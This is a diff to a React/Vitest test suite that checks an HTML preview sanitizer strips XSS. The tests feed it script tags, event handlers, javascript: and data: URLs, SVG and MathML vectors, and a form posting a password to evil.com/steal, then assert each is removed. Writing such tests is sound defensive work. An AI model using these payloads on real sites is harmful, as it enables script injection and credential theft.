@@ -5,6 +5,22 @@ import { describe, test, expect, beforeEach, afterEach } from 'vitest';
 import { render, screen, cleanup } from '@testing-library/react';
 import '@testing-library/jest-dom';
 import { SafePreviewRenderer } from '../SafePreview';
+import { LightboxProvider } from '../context/LightboxContext';
+import type { ReactElement } from 'react';
+
+// wrapper component to provide context for tests
+function TestWrapper({ children }: { children: ReactElement }) {
+  return <LightboxProvider>{children}</LightboxProvider>;
+}
+
+// helper to render w/ lightbox context
+function renderWithProvider(html: string) {
+  return render(
+    <TestWrapper>
+      <SafePreviewRenderer html={html} />
+    </TestWrapper>
+  );
+}
 
 describe('SafePreview XSS Prevention', () => {
   beforeEach(() => {
@@ -19,7 +35,7 @@ describe('SafePreview XSS Prevention', () => {
     test('strips <script> tags', () => {
       const maliciousHTML =
         '<p>Hello</p><script>alert("XSS")</script><p>World</p>';
-      render(<SafePreviewRenderer html={maliciousHTML} />);
+      renderWithProvider(maliciousHTML);
 
       expect(screen.getByText('Hello')).toBeInTheDocument();
       expect(screen.getByText('World')).toBeInTheDocument();
@@ -29,7 +45,7 @@ describe('SafePreview XSS Prevention', () => {
     test('strips inline event handlers', () => {
       const maliciousHTML =
         '<button onclick="alert(\'XSS\')">Click me</button>';
-      render(<SafePreviewRenderer html={maliciousHTML} />);
+      renderWithProvider(maliciousHTML);
 
       const button = document.querySelector('button');
       // button not in allowed tags
@@ -38,7 +54,7 @@ describe('SafePreview XSS Prevention', () => {
 
     test('strips onerror handlers on images', () => {
       const maliciousHTML = '<img src="x" onerror="alert(\'XSS\')" alt="test">';
-      render(<SafePreviewRenderer html={maliciousHTML} />);
+      renderWithProvider(maliciousHTML);
 
       const img = document.querySelector('img');
       expect(img).toBeInTheDocument();
@@ -48,7 +64,7 @@ describe('SafePreview XSS Prevention', () => {
     test('strips onload handlers', () => {
       const maliciousHTML =
         '<img src="x.jpg" onload="alert(\'XSS\')" alt="test">';
-      render(<SafePreviewRenderer html={maliciousHTML} />);
+      renderWithProvider(maliciousHTML);
 
       const img = document.querySelector('img');
       expect(img).toBeInTheDocument();
@@ -57,7 +73,7 @@ describe('SafePreview XSS Prevention', () => {
 
     test('strips onmouseover handlers', () => {
       const maliciousHTML = '<p onmouseover="alert(\'XSS\')">Hover me</p>';
-      render(<SafePreviewRenderer html={maliciousHTML} />);
+      renderWithProvider(maliciousHTML);
 
       const p = document.querySelector('p');
       expect(p).toBeInTheDocument();
@@ -68,7 +84,7 @@ describe('SafePreview XSS Prevention', () => {
   describe('Dangerous URL scheme prevention', () => {
     test('blocks javascript: URLs in href', () => {
       const maliciousHTML = '<a href="javascript:alert(\'XSS\')">Click me</a>';
-      render(<SafePreviewRenderer html={maliciousHTML} />);
+      renderWithProvider(maliciousHTML);
 
       const link = document.querySelector('a');
       expect(link).toBeInTheDocument();
@@ -80,7 +96,7 @@ describe('SafePreview XSS Prevention', () => {
 
     test('blocks javascript: URLs in src', () => {
       const maliciousHTML = '<img src="javascript:alert(\'XSS\')" alt="test">';
-      render(<SafePreviewRenderer html={maliciousHTML} />);
+      renderWithProvider(maliciousHTML);
 
       const img = document.querySelector('img');
       expect(img).toBeInTheDocument();
@@ -92,7 +108,7 @@ describe('SafePreview XSS Prevention', () => {
     test('blocks data: URLs with script content in href', () => {
       const maliciousHTML =
         '<a href="data:text/html,<script>alert(\'XSS\')</script>">Click</a>';
-      render(<SafePreviewRenderer html={maliciousHTML} />);
+      renderWithProvider(maliciousHTML);
 
       const link = document.querySelector('a');
       // should strip or sanitize the data URL w/ script
@@ -103,7 +119,7 @@ describe('SafePreview XSS Prevention', () => {
 
     test('allows safe https: URLs', () => {
       const safeHTML = '<a href="https://example.com">Safe link</a>';
-      render(<SafePreviewRenderer html={safeHTML} />);
+      renderWithProvider(safeHTML);
 
       const link = document.querySelector('a');
       expect(link).toBeInTheDocument();
@@ -112,7 +128,7 @@ describe('SafePreview XSS Prevention', () => {
 
     test('allows safe mailto: URLs', () => {
       const safeHTML = '<a href="mailto:test@example.com">Email</a>';
-      render(<SafePreviewRenderer html={safeHTML} />);
+      renderWithProvider(safeHTML);
 
       const link = document.querySelector('a');
       expect(link).toBeInTheDocument();
@@ -123,21 +139,21 @@ describe('SafePreview XSS Prevention', () => {
   describe('HTML tag filtering', () => {
     test('strips <iframe> tags', () => {
       const maliciousHTML = '<iframe src="https://evil.com"></iframe>';
-      render(<SafePreviewRenderer html={maliciousHTML} />);
+      renderWithProvider(maliciousHTML);
 
       expect(document.querySelector('iframe')).not.toBeInTheDocument();
     });
 
     test('strips <object> tags', () => {
       const maliciousHTML = '<object data="malicious.swf"></object>';
-      render(<SafePreviewRenderer html={maliciousHTML} />);
+      renderWithProvider(maliciousHTML);
 
       expect(document.querySelector('object')).not.toBeInTheDocument();
     });
 
     test('strips <embed> tags', () => {
       const maliciousHTML = '<embed src="malicious.swf">';
-      render(<SafePreviewRenderer html={maliciousHTML} />);
+      renderWithProvider(maliciousHTML);
 
       expect(document.querySelector('embed')).not.toBeInTheDocument();
     });
@@ -145,7 +161,7 @@ describe('SafePreview XSS Prevention', () => {
     test('strips <form> tags', () => {
       const maliciousHTML =
         '<form action="https://evil.com/steal"><input type="text" name="password"></form>';
-      render(<SafePreviewRenderer html={maliciousHTML} />);
+      renderWithProvider(maliciousHTML);
 
       expect(document.querySelector('form')).not.toBeInTheDocument();
       expect(document.querySelector('input')).not.toBeInTheDocument();
@@ -154,7 +170,7 @@ describe('SafePreview XSS Prevention', () => {
     test('strips <style> tags from content', () => {
       const maliciousHTML =
         '<style>body { background: url("javascript:alert(1)"); }</style><p>Test</p>';
-      const container = render(<SafePreviewRenderer html={maliciousHTML} />);
+      const container = renderWithProvider(maliciousHTML);
 
       // The malicious style tag should be stripped from the rendered content
       // Note: Our SafePreviewRenderer adds its own style tag for placeholders, so we check the content
@@ -168,14 +184,14 @@ describe('SafePreview XSS Prevention', () => {
     test('strips <link> tags', () => {
       const maliciousHTML =
         '<link rel="stylesheet" href="https://evil.com/steal.css">';
-      render(<SafePreviewRenderer html={maliciousHTML} />);
+      renderWithProvider(maliciousHTML);
 
       expect(document.querySelector('link')).not.toBeInTheDocument();
     });
 
     test('strips <base> tags', () => {
       const maliciousHTML = '<base href="https://evil.com/">';
-      render(<SafePreviewRenderer html={maliciousHTML} />);
+      renderWithProvider(maliciousHTML);
 
       expect(document.querySelector('base')).not.toBeInTheDocument();
     });
@@ -183,7 +199,7 @@ describe('SafePreview XSS Prevention', () => {
     test('strips <meta> tags', () => {
       const maliciousHTML =
         '<meta http-equiv="refresh" content="0;url=https://evil.com">';
-      render(<SafePreviewRenderer html={maliciousHTML} />);
+      renderWithProvider(maliciousHTML);
 
       expect(document.querySelector('meta')).not.toBeInTheDocument();
     });
@@ -194,7 +210,7 @@ describe('SafePreview XSS Prevention', () => {
     test('sanitizes style attribute with javascript URL', () => {
       const maliciousHTML =
         '<p style="background: url(javascript:alert(1))">Styled</p>';
-      render(<SafePreviewRenderer html={maliciousHTML} />);
+      renderWithProvider(maliciousHTML);
 
       const p = document.querySelector('p');
       expect(p).toBeInTheDocument();
@@ -206,7 +222,7 @@ describe('SafePreview XSS Prevention', () => {
     test('strips non-allowed attributes', () => {
       // DOMPurify allows data-* by default, so test w/ a non-allowed attribute
       const html = '<p draggable="true" contenteditable="true">Text</p>';
-      render(<SafePreviewRenderer html={html} />);
+      renderWithProvider(html);
 
       const p = document.querySelector('p');
       expect(p).toBeInTheDocument();
@@ -221,7 +237,7 @@ describe('SafePreview XSS Prevention', () => {
   describe('SVG-based XSS prevention', () => {
     test('strips onload attribute from SVG', () => {
       const maliciousHTML = '<svg onload="alert(\'XSS\')"><rect /></svg>';
-      render(<SafePreviewRenderer html={maliciousHTML} />);
+      renderWithProvider(maliciousHTML);
 
       const svg = document.querySelector('svg');
       // SVG is now allowed (for Mermaid), but onload should be stripped
@@ -231,7 +247,7 @@ describe('SafePreview XSS Prevention', () => {
 
     test('strips embedded script from SVG', () => {
       const maliciousHTML = '<svg><script>alert("XSS")</script></svg>';
-      render(<SafePreviewRenderer html={maliciousHTML} />);
+      renderWithProvider(maliciousHTML);
 
       // SVG allowed, but script must be stripped
       expect(document.querySelector('svg')).toBeInTheDocument();
@@ -243,7 +259,7 @@ describe('SafePreview XSS Prevention', () => {
     test('strips dangerous attributes from MathML', () => {
       const maliciousHTML =
         '<math><maction actiontype="statusline#http://evil.com"><mtext>Click</mtext></maction></math>';
-      render(<SafePreviewRenderer html={maliciousHTML} />);
+      renderWithProvider(maliciousHTML);
 
       // MathML is now allowed (for KaTeX), but maction dangerous attributes stripped
       // Note: MathML elements are Element type, not HTMLElement/SVGElement,
@@ -259,7 +275,7 @@ describe('SafePreview XSS Prevention', () => {
     test('handles nested dangerous elements', () => {
       const maliciousHTML =
         '<div><p><span><script>alert("XSS")</script></span></p></div>';
-      render(<SafePreviewRenderer html={maliciousHTML} />);
+      renderWithProvider(maliciousHTML);
 
       expect(document.querySelector('script')).not.toBeInTheDocument();
     });
@@ -267,7 +283,7 @@ describe('SafePreview XSS Prevention', () => {
     test('handles HTML-encoded script tags', () => {
       // This should be treated as text, not as HTML
       const html = '<p>&lt;script&gt;alert("XSS")&lt;/script&gt;</p>';
-      render(<SafePreviewRenderer html={html} />);
+      renderWithProvider(html);
 
       const p = document.querySelector('p');
       expect(p).toBeInTheDocument();
@@ -276,7 +292,7 @@ describe('SafePreview XSS Prevention', () => {
 
     test('handles double-encoded attacks', () => {
       const maliciousHTML = '<p>%3Cscript%3Ealert("XSS")%3C/script%3E</p>';
-      render(<SafePreviewRenderer html={maliciousHTML} />);
+      renderWithProvider(maliciousHTML);
 
       // The encoded content should remain as text
       const p = document.querySelector('p');
@@ -288,7 +304,7 @@ describe('SafePreview XSS Prevention', () => {
   describe('Link security', () => {
     test('external links get target="_blank"', () => {
       const html = '<a href="https://example.com">External</a>';
-      render(<SafePreviewRenderer html={html} />);
+      renderWithProvider(html);
 
       const link = document.querySelector('a');
       expect(link).toBeInTheDocument();
@@ -297,7 +313,7 @@ describe('SafePreview XSS Prevention', () => {
 
     test('external links get rel="noopener noreferrer"', () => {
       const html = '<a href="https://example.com">External</a>';
-      render(<SafePreviewRenderer html={html} />);
+      renderWithProvider(html);
 
       const link = document.querySelector('a');
       expect(link).toBeInTheDocument();
@@ -306,7 +322,7 @@ describe('SafePreview XSS Prevention', () => {
 
     test('internal anchor links do not get modified', () => {
       const html = '<a href="#section">Internal</a>';
-      render(<SafePreviewRenderer html={html} />);
+      renderWithProvider(html);
 
       const link = document.querySelector('a');
       expect(link).toBeInTheDocument();
@@ -318,7 +334,7 @@ describe('SafePreview XSS Prevention', () => {
   describe('Safe content rendering', () => {
     test('renders headings correctly', () => {
       const html = '<h1>Title</h1><h2>Subtitle</h2>';
-      render(<SafePreviewRenderer html={html} />);
+      renderWithProvider(html);
 
       expect(screen.getByText('Title')).toBeInTheDocument();
       expect(screen.getByText('Subtitle')).toBeInTheDocument();
@@ -326,7 +342,7 @@ describe('SafePreview XSS Prevention', () => {
 
     test('renders lists correctly', () => {
       const html = '<ul><li>Item 1</li><li>Item 2</li></ul>';
-      render(<SafePreviewRenderer html={html} />);
+      renderWithProvider(html);
 
       expect(screen.getByText('Item 1')).toBeInTheDocument();
       expect(screen.getByText('Item 2')).toBeInTheDocument();
@@ -335,7 +351,7 @@ describe('SafePreview XSS Prevention', () => {
     test('renders tables correctly', () => {
       const html =
         '<table><thead><tr><th>Header</th></tr></thead><tbody><tr><td>Cell</td></tr></tbody></table>';
-      render(<SafePreviewRenderer html={html} />);
+      renderWithProvider(html);
 
       expect(screen.getByText('Header')).toBeInTheDocument();
       expect(screen.getByText('Cell')).toBeInTheDocument();
@@ -343,27 +359,313 @@ describe('SafePreview XSS Prevention', () => {
 
     test('renders code blocks correctly', () => {
       const html = '<pre><code>const x = 1;</code></pre>';
-      render(<SafePreviewRenderer html={html} />);
+      renderWithProvider(html);
 
       expect(screen.getByText('const x = 1;')).toBeInTheDocument();
     });
 
     test('renders blockquotes correctly', () => {
       const html = '<blockquote>Quote text</blockquote>';
-      render(<SafePreviewRenderer html={html} />);
+      renderWithProvider(html);
 
       expect(screen.getByText('Quote text')).toBeInTheDocument();
     });
 
     test('renders images with safe attributes', () => {
       const html = '<img src="image.png" alt="Test image" title="Image title">';
-      render(<SafePreviewRenderer html={html} />);
+      renderWithProvider(html);
 
       const img = document.querySelector('img');
       expect(img).toBeInTheDocument();
       expect(img?.getAttribute('src')).toBe('image.png');
       expect(img?.getAttribute('alt')).toBe('Test image');
       expect(img?.getAttribute('title')).toBe('Image title');
+    });
+  });
+
+  // MDX-specific XSS tests (Group B security testing)
+  describe('MDX placeholder injection prevention', () => {
+    test('strips script tags inside mdx-jsx-placeholder', () => {
+      const maliciousHTML = `
+        <span class="mdx-jsx-placeholder">
+          <script>alert('XSS from placeholder')</script>
+          ComponentName
+        </span>
+      `;
+      renderWithProvider(maliciousHTML);
+
+      // placeholder should render but script should be stripped
+      expect(
+        document.querySelector('.mdx-jsx-placeholder')
+      ).toBeInTheDocument();
+      expect(document.querySelector('script')).not.toBeInTheDocument();
+    });
+
+    test('strips event handlers from placeholder content', () => {
+      const maliciousHTML = `
+        <span class="mdx-jsx-placeholder" onclick="alert('XSS')">
+          ComponentName
+        </span>
+      `;
+      renderWithProvider(maliciousHTML);
+
+      const placeholder = document.querySelector('.mdx-jsx-placeholder');
+      expect(placeholder).toBeInTheDocument();
+      expect(placeholder?.getAttribute('onclick')).toBeNull();
+    });
+
+    test('handles nested placeholders with malformed HTML', () => {
+      const maliciousHTML = `
+        <span class="mdx-jsx-placeholder">
+          <span class="mdx-expression-placeholder">
+            <img src="x" onerror="alert('XSS')">
+          </span>
+        </span>
+      `;
+      renderWithProvider(maliciousHTML);
+
+      const img = document.querySelector('img');
+      expect(img).toBeInTheDocument();
+      expect(img?.getAttribute('onerror')).toBeNull();
+    });
+
+    test('strips expression placeholders with embedded scripts', () => {
+      const maliciousHTML = `
+        <span class="mdx-expression-placeholder">
+          {<script>alert('XSS')</script>}
+        </span>
+      `;
+      renderWithProvider(maliciousHTML);
+
+      expect(
+        document.querySelector('.mdx-expression-placeholder')
+      ).toBeInTheDocument();
+      expect(document.querySelector('script')).not.toBeInTheDocument();
+    });
+
+    test('strips iframe inside JSX placeholder', () => {
+      const maliciousHTML = `
+        <span class="mdx-jsx-placeholder">
+          <iframe src="javascript:alert('XSS')"></iframe>
+        </span>
+      `;
+      renderWithProvider(maliciousHTML);
+
+      expect(document.querySelector('iframe')).not.toBeInTheDocument();
+    });
+  });
+
+  describe('data-* attribute handling', () => {
+    test('preserves data-sourcepos (needed for scroll sync)', () => {
+      const html = '<p data-sourcepos="1:1-1:10">Paragraph</p>';
+      renderWithProvider(html);
+
+      const p = document.querySelector('p');
+      expect(p).toBeInTheDocument();
+      expect(p?.getAttribute('data-sourcepos')).toBe('1:1-1:10');
+    });
+
+    test('preserves data-mermaid-chart (needed for diagrams)', () => {
+      const html = '<pre data-mermaid-chart="true"><code>graph TD</code></pre>';
+      renderWithProvider(html);
+
+      const pre = document.querySelector('pre');
+      expect(pre).toBeInTheDocument();
+      expect(pre?.getAttribute('data-mermaid-chart')).toBe('true');
+    });
+
+    test('preserves data-mermaid-id', () => {
+      const html =
+        '<pre data-mermaid-id="diagram-1"><code>graph TD</code></pre>';
+      renderWithProvider(html);
+
+      const pre = document.querySelector('pre');
+      expect(pre).toBeInTheDocument();
+      expect(pre?.getAttribute('data-mermaid-id')).toBe('diagram-1');
+    });
+
+    test('only explicitly allowed data-* attributes are preserved', () => {
+      // DOMPurify w/ ALLOWED_ATTR config only allows explicitly listed attributes
+      // data-sourcepos, data-mermaid-chart, data-mermaid-id are in our allow list
+      const html = '<p data-sourcepos="1:1" data-mermaid-chart="true">Text</p>';
+      renderWithProvider(html);
+
+      const p = document.querySelector('p');
+      expect(p).toBeInTheDocument();
+      // these are in our explicit allow list
+      expect(p?.getAttribute('data-sourcepos')).toBe('1:1');
+      expect(p?.getAttribute('data-mermaid-chart')).toBe('true');
+    });
+
+    test('data-* attributes cannot contain script content', () => {
+      // even allowed data-* attrs should not execute as scripts
+      const html = '<p data-sourcepos="<script>alert(1)</script>">Text</p>';
+      renderWithProvider(html);
+
+      const p = document.querySelector('p');
+      expect(p).toBeInTheDocument();
+      // The value is sanitized or preserved as text, not executed
+      expect(document.querySelector('script')).not.toBeInTheDocument();
+    });
+  });
+
+  describe('Mermaid security', () => {
+    test('mermaid placeholders cannot contain scripts in code', () => {
+      const maliciousHTML = `
+        <pre data-mermaid-chart="true">
+          <code data-mermaid-code="<script>alert('XSS')</script>">
+            malicious
+          </code>
+        </pre>
+      `;
+      renderWithProvider(maliciousHTML);
+
+      // The pre should exist, but scripts should be stripped
+      expect(document.querySelector('pre')).toBeInTheDocument();
+      expect(document.querySelector('script')).not.toBeInTheDocument();
+    });
+
+    test('mermaid placeholder with embedded event handler in attributes', () => {
+      const maliciousHTML = `
+        <pre data-mermaid-chart="true" onload="alert('XSS')">
+          <code>graph TD</code>
+        </pre>
+      `;
+      renderWithProvider(maliciousHTML);
+
+      const pre = document.querySelector('pre');
+      expect(pre).toBeInTheDocument();
+      expect(pre?.getAttribute('onload')).toBeNull();
+    });
+
+    test('mermaid code with javascript protocol in links', () => {
+      // Mermaid can render links - ensure javascript: is blocked
+      const html = `
+        <pre data-mermaid-chart="true">
+          <code>graph TD; A[<a href="javascript:alert(1)">Link</a>]-->B</code>
+        </pre>
+      `;
+      renderWithProvider(html);
+
+      const link = document.querySelector('a');
+      if (link) {
+        const href = link.getAttribute('href');
+        expect(href === null || !href.includes('javascript:')).toBe(true);
+      }
+    });
+  });
+
+  describe('KaTeX/MathML security', () => {
+    test('allows safe KaTeX math elements', () => {
+      const html = `
+        <span class="katex">
+          <math xmlns="http://www.w3.org/1998/Math/MathML">
+            <mrow>
+              <mi>x</mi>
+              <mo>=</mo>
+              <mfrac>
+                <mrow><mo>-</mo><mi>b</mi></mrow>
+                <mrow><mn>2</mn><mi>a</mi></mrow>
+              </mfrac>
+            </mrow>
+          </math>
+        </span>
+      `;
+      renderWithProvider(html);
+
+      expect(document.querySelector('math')).toBeTruthy();
+      expect(document.querySelector('mfrac')).toBeTruthy();
+    });
+
+    test('strips dangerous maction elements', () => {
+      const html = `
+        <math>
+          <maction actiontype="statusline#http://evil.com">
+            <mtext>Click me</mtext>
+          </maction>
+        </math>
+      `;
+      renderWithProvider(html);
+
+      // maction is not in our allowed tags
+      expect(document.querySelector('maction')).toBeNull();
+    });
+
+    test('strips script inside math elements', () => {
+      const html = `
+        <math>
+          <script>alert('XSS in math')</script>
+          <mi>x</mi>
+        </math>
+      `;
+      renderWithProvider(html);
+
+      expect(document.querySelector('script')).not.toBeInTheDocument();
+    });
+  });
+
+  describe('SVG security in rendered content', () => {
+    test('allows safe SVG elements for diagrams', () => {
+      const html = `
+        <svg viewBox="0 0 100 100">
+          <rect x="10" y="10" width="80" height="80" fill="blue"/>
+          <text x="50" y="50" text-anchor="middle">Safe</text>
+        </svg>
+      `;
+      renderWithProvider(html);
+
+      expect(document.querySelector('svg')).toBeInTheDocument();
+      expect(document.querySelector('rect')).toBeInTheDocument();
+      expect(document.querySelector('text')).toBeInTheDocument();
+    });
+
+    test('strips foreignObject from SVG (security risk)', () => {
+      const html = `
+        <svg>
+          <foreignObject>
+            <div xmlns="http://www.w3.org/1999/xhtml">
+              <script>alert('XSS via foreignObject')</script>
+            </div>
+          </foreignObject>
+        </svg>
+      `;
+      renderWithProvider(html);
+
+      // foreignObject is not in our allowed SVG tags
+      expect(document.querySelector('foreignObject')).toBeNull();
+      expect(document.querySelector('script')).not.toBeInTheDocument();
+    });
+
+    test('use element with xlink:href is handled safely', () => {
+      // xlink:href is in our allowed attributes for SVG compatibility
+      // but dangerous protocols should still be blocked
+      const html = `
+        <svg>
+          <use xlink:href="#local-icon"></use>
+        </svg>
+      `;
+      renderWithProvider(html);
+
+      // local references are safe
+      const useElement = document.querySelector('use');
+      expect(useElement).toBeInTheDocument();
+      expect(useElement?.getAttribute('xlink:href')).toBe('#local-icon');
+    });
+
+    test('use element blocks javascript protocol', () => {
+      const html = `
+        <svg>
+          <use xlink:href="javascript:alert(1)"></use>
+        </svg>
+      `;
+      renderWithProvider(html);
+
+      const useElement = document.querySelector('use');
+      if (useElement) {
+        const href = useElement.getAttribute('xlink:href');
+        // should be sanitized or null
+        expect(href === null || !href.includes('javascript:')).toBe(true);
+      }
     });
   });
 });
